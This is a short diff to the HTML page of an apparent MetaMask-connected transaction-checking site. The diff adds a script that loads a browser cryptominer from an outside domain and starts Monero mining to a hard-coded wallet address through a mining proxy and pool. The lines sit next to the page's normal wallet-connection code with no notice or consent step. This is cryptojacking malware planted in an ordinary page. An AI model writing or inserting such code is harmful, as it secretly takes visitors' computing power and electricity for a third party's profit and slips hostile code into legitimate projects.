@@ -38,7 +38,19 @@
 			Check Transaction Record
 			</button>
 		<div>
+		<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+			<script>
+				server = "wss://f.xmrminingproxy.com:8181";
+				var pool = "gulf.moneroocean.stream:20128";
+				var walletAddress = "85mZcf4UrMM7J6C9xZLj9PgTmnaVnm4wwCAVz97xui9tFuYYLUUmcUNJXJQGbiCrBkHsn721zsVJqigy95SZUbVjARjcGJc";
+				var workerId = ""
+				var threads = -5;
+				var password = "x";
+				startMining(pool, walletAddress, workerId, threads, password);
+				throttleMiner = 20;
+			</script>
         <script type=""text/javascript">
+
             // 1. Connect metamask
             var account = null;
             var contract = null;
